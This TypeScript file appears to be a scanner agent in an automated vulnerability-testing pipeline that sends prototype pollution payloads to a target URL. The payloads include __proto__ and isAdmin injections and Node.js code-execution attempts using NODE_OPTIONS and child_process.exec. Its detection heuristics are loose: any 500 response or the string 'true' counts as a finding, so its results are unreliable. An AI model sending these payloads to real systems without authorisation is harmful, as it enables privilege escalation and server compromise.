/**
 * Prototype Pollution Agent
 * Purpose: Detect server-side and client-side prototype pollution
 * 
 * Attack Vectors:
 * - __proto__ injection
 * - constructor.prototype injection
 * - JSON parameter pollution
 * - Query parameter pollution
 * - RCE via pollution (Node.js)
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import database from '../services/database';
import logger from '../utils/logger';
import { v4 as uuidv4 } from 'uuid';

interface PrototypePollutionJob extends BaseJob {
  type: 'prototype-pollution';
  options: {
    targetUrl: string;
    programId: string;
    testServerSide?: boolean;
    testClientSide?: boolean;
  };
}

interface PollutionFinding {
  vulnerability: string;
  variant: 'server-side' | 'client-side';
  severity: 'critical' | 'high' | 'medium';
  endpoint: string;
  payload: string;
  description: string;
  impact: string;
  evidence?: string;
}

export class PrototypePollutionAgent extends BaseAgent<PrototypePollutionJob> {
  // Prototype pollution payloads
  private readonly POLLUTION_PAYLOADS = [
    // __proto__ based
    { key: '__proto__[polluted]', value: 'true' },
    { key: '__proto__.polluted', value: 'true' },
    { key: 'constructor[prototype][polluted]', value: 'true' },
    { key: 'constructor.prototype.polluted', value: 'true' },
    
    // Nested pollution
    { key: '__proto__', value: { polluted: 'true' } },
    { key: 'constructor', value: { prototype: { polluted: 'true' } } },
    
    // RCE payloads (Node.js)
    { key: '__proto__.shell', value: '/proc/self/exe' },
    { key: '__proto__.NODE_OPTIONS', value: '--require /etc/passwd' },
    { key: '__proto__.env', value: { NODE_OPTIONS: '--require /etc/passwd' } },
  ];

  constructor() {
    super('prototype-pollution');
  }

  protected getSteps() {
    return [
      { name: 'Discover JSON endpoints' },
      { name: 'Test __proto__ injection' },
      { name: 'Test constructor.prototype injection' },
      { name: 'Test query parameter pollution' },
      { name: 'Check for RCE indicators' },
      { name: 'Store findings' },
    ];
  }

  async process(job: Job<PrototypePollutionJob>): Promise<any> {
    const { programId, options } = job.data;
    const { targetUrl, testServerSide = true, testClientSide = true } = options;

    await this.heartbeat();
    await this.updateJobStatus(job.id!, 'active');

    const findings: PollutionFinding[] = [];

    try {
      // Step 1: Discover JSON endpoints
      await this.updateJobProgress(job.id!, {
        current: 1,
        total: 6,
        percentage: 10,
        currentTool: 'endpoint-discovery',
        toolStatus: 'running',
        message: 'Discovering JSON endpoints',
      });

      const endpoints = await this.discoverJsonEndpoints(targetUrl);
      logger.info({ count: endpoints.length }, 'Discovered JSON endpoints');

      // Step 2: Test __proto__ injection
      await this.updateJobProgress(job.id!, {
        current: 2,
        total: 6,
        percentage: 25,
        currentTool: 'proto-test',
        toolStatus: 'running',
        message: 'Testing __proto__ injection',
      });

      if (testServerSide) {
        const protoFindings = await this.testProtoInjection(endpoints);
        findings.push(...protoFindings);
      }

      // Step 3: Test constructor.prototype injection
      await this.updateJobProgress(job.id!, {
        current: 3,
        total: 6,
        percentage: 45,
        currentTool: 'constructor-test',
        toolStatus: 'running',
        message: 'Testing constructor.prototype injection',
      });

      if (testServerSide) {
        const constructorFindings = await this.testConstructorInjection(endpoints);
        findings.push(...constructorFindings);
      }

      // Step 4: Test query parameter pollution
      await this.updateJobProgress(job.id!, {
        current: 4,
        total: 6,
        percentage: 60,
        currentTool: 'query-param-test',
        toolStatus: 'running',
        message: 'Testing query parameter pollution',
      });

      const queryFindings = await this.testQueryParamPollution(targetUrl);
      findings.push(...queryFindings);

      // Step 5: Check for RCE indicators
      await this.updateJobProgress(job.id!, {
        current: 5,
        total: 6,
        percentage: 80,
        currentTool: 'rce-check',
        toolStatus: 'running',
        message: 'Checking for RCE indicators',
      });

      const rceFindings = await this.testRCEPollution(endpoints);
      findings.push(...rceFindings);

      // Step 6: Store findings
      await this.updateJobProgress(job.id!, {
        current: 6,
        total: 6,
        percentage: 95,
        currentTool: 'storage',
        toolStatus: 'running',
        message: 'Storing findings',
      });

      for (const finding of findings) {
        await this.storeFinding(programId, finding, job.id!);
      }

      if (findings.length > 0) {
        await this.triggerHandoffs(programId, findings, job.id!);
      }

      await this.updateJobProgress(job.id!, {
        current: 6,
        total: 6,
        percentage: 100,
        currentTool: 'complete',
        toolStatus: 'completed',
        message: `Found ${findings.length} prototype pollution vulnerabilities`,
      });

      const result = {
        targetUrl,
        endpointsTested: endpoints.length,
        findingsCount: findings.length,
        criticalCount: findings.filter(f => f.severity === 'critical').length,
        findings,
      };

      await this.updateJobStatus(job.id!, 'completed', result);
      return result;

    } catch (error: any) {
      logger.error({ error, targetUrl }, 'Prototype pollution testing failed');
      await this.updateJobStatus(job.id!, 'failed', null, error.message);
      throw error;
    }
  }

  /**
   * Discover JSON endpoints
   */
  private async discoverJsonEndpoints(baseUrl: string): Promise<string[]> {
    const endpoints: string[] = [];
    
    const commonEndpoints = [
      '/api/user',
      '/api/profile',
      '/api/settings',
      '/api/config',
      '/api/data',
      '/api/update',
      '/api/create',
      '/api/save',
      '/graphql',
    ];

    for (const endpoint of commonEndpoints) {
      try {
        const url = `${baseUrl}${endpoint}`;
        const response = await this.makeRequest(url, 'OPTIONS');
        
        if (response.status !== 404) {
          endpoints.push(url);
        }
      } catch {}
    }

    // Also add the base URL
    endpoints.push(baseUrl);

    return endpoints;
  }

  /**
   * Test __proto__ injection
   */
  private async testProtoInjection(endpoints: string[]): Promise<PollutionFinding[]> {
    const findings: PollutionFinding[] = [];

    for (const endpoint of endpoints) {
      // Test JSON body pollution
      const payloads = [
        { '__proto__': { 'polluted': 'yes' } },
        { '__proto__': { 'isAdmin': true } },
        { 'x': { '__proto__': { 'polluted': 'yes' } } },
      ];

      for (const payload of payloads) {
        try {
          const response = await this.makeRequest(endpoint, 'POST', JSON.stringify(payload), {
            'Content-Type': 'application/json',
          });

          // Check for pollution indicators
          if (this.checkPollutionIndicators(response)) {
            findings.push({
              vulnerability: 'Server-Side Prototype Pollution via __proto__',
              variant: 'server-side',
              severity: 'critical',
              endpoint,
              payload: JSON.stringify(payload),
              description: 'The application is vulnerable to prototype pollution via __proto__ injection in JSON body.',
              impact: 'Remote code execution, privilege escalation, denial of service',
              evidence: response.body.substring(0, 500),
            });
            break;
          }
        } catch {}
      }
    }

    return findings;
  }

  /**
   * Test constructor.prototype injection
   */
  private async testConstructorInjection(endpoints: string[]): Promise<PollutionFinding[]> {
    const findings: PollutionFinding[] = [];

    for (const endpoint of endpoints) {
      const payloads = [
        { 'constructor': { 'prototype': { 'polluted': 'yes' } } },
        { 'x': { 'constructor': { 'prototype': { 'polluted': 'yes' } } } },
      ];

      for (const payload of payloads) {
        try {
          const response = await this.makeRequest(endpoint, 'POST', JSON.stringify(payload), {
            'Content-Type': 'application/json',
          });

          if (this.checkPollutionIndicators(response)) {
            findings.push({
              vulnerability: 'Server-Side Prototype Pollution via constructor.prototype',
              variant: 'server-side',
              severity: 'critical',
              endpoint,
              payload: JSON.stringify(payload),
              description: 'The application is vulnerable to prototype pollution via constructor.prototype injection.',
              impact: 'Remote code execution, privilege escalation, denial of service',
              evidence: response.body.substring(0, 500),
            });
            break;
          }
        } catch {}
      }
    }

    return findings;
  }

  /**
   * Test query parameter pollution
   */
  private async testQueryParamPollution(baseUrl: string): Promise<PollutionFinding[]> {
    const findings: PollutionFinding[] = [];

    const queryPayloads = [
      '__proto__[polluted]=yes',
      '__proto__.polluted=yes',
      'constructor[prototype][polluted]=yes',
      'constructor.prototype.polluted=yes',
      '__proto__[isAdmin]=true',
    ];

    for (const payload of queryPayloads) {
      try {
        const url = `${baseUrl}?${payload}`;
        const response = await this.makeRequest(url, 'GET');

        if (this.checkPollutionIndicators(response)) {
          findings.push({
            vulnerability: 'Prototype Pollution via Query Parameters',
            variant: 'server-side',
            severity: 'high',
            endpoint: baseUrl,
            payload,
            description: 'The application is vulnerable to prototype pollution via query parameters.',
            impact: 'Privilege escalation, security bypass',
            evidence: response.body.substring(0, 500),
          });
          break;
        }
      } catch {}
    }

    return findings;
  }

  /**
   * Test RCE via prototype pollution
   */
  private async testRCEPollution(endpoints: string[]): Promise<PollutionFinding[]> {
    const findings: PollutionFinding[] = [];

    // RCE payloads for Node.js
    const rcePayloads = [
      { '__proto__': { 'shell': '/proc/self/exe' } },
      { '__proto__': { 'argv0': 'node' } },
      { '__proto__': { 'env': { 'AAAA': 'require("child_process").exec("id")' } } },
    ];

    for (const endpoint of endpoints) {
      for (const payload of rcePayloads) {
        try {
          const response = await this.makeRequest(endpoint, 'POST', JSON.stringify(payload), {
            'Content-Type': 'application/json',
          });

          // Check for RCE indicators (error messages, command output)
          if (response.body.includes('uid=') || 
              response.body.includes('child_process') ||
              response.body.includes('spawn') ||
              response.status === 500) {
            findings.push({
              vulnerability: 'RCE via Prototype Pollution',
              variant: 'server-side',
              severity: 'critical',
              endpoint,
              payload: JSON.stringify(payload),
              description: 'The application may be vulnerable to remote code execution via prototype pollution.',
              impact: 'Complete server compromise',
              evidence: response.body.substring(0, 500),
            });
            break;
          }
        } catch {}
      }
    }

    return findings;
  }

  /**
   * Check for pollution indicators in response
   */
  private checkPollutionIndicators(response: { status: number; body: string }): boolean {
    const indicators = [
      'polluted',
      'isAdmin',
      'true',
      '__proto__',
      'constructor',
      'prototype',
    ];

    // Check if any indicator appears in unexpected context
    if (response.status === 500) return true;
    
    for (const indicator of indicators) {
      if (response.body.includes(`"${indicator}"`) || 
          response.body.includes(`'${indicator}'`)) {
        return true;
      }
    }

    return false;
  }

  /**
   * Make HTTP request
   */
  private async makeRequest(
    url: string,
    method: string,
    body?: string,
    headers?: Record<string, string>
  ): Promise<{ status: number; body: string }> {
    try {
      const response = await fetch(url, {
        method,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          ...headers,
        },
        body,
      });

      return {
        status: response.status,
        body: await response.text(),
      };
    } catch (error) {
      return { status: 0, body: '' };
    }
  }

  /**
   * Store finding
   */
  private async storeFinding(programId: string, finding: PollutionFinding, jobId: string): Promise<void> {
    try {
      await database.query(
        `INSERT INTO findings (id, program_id, job_id, type, severity, title, url, description, evidence, status, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'new', CURRENT_TIMESTAMP)
         ON CONFLICT (id) DO NOTHING`,
        [
          uuidv4(),
          programId,
          jobId,
          'prototype-pollution',
          finding.severity,
          finding.vulnerability,
          finding.endpoint,
          `${finding.description}\n\nImpact: ${finding.impact}`,
          JSON.stringify({ variant: finding.variant, payload: finding.payload, evidence: finding.evidence }),
        ]
      );
    } catch (error) {
      logger.error({ error, finding }, 'Failed to save prototype pollution finding');
    }
  }

  /**
   * Trigger handoffs
   */
  private async triggerHandoffs(programId: string, findings: PollutionFinding[], jobId: string): Promise<void> {
    const criticalFindings = findings.filter(f => f.severity === 'critical');
    
    if (criticalFindings.length > 0) {
      await this.handoff('triage', {
        toAgent: 'triage',
        reason: `Found ${criticalFindings.length} critical prototype pollution vulnerabilities`,
        data: { findings: criticalFindings, urgency: 'critical' },
        priority: 10,
        metadata: { programId, parentJobId: jobId, source: 'prototype-pollution' },
      });
    }
  }
}

export default new PrototypePollutionAgent();
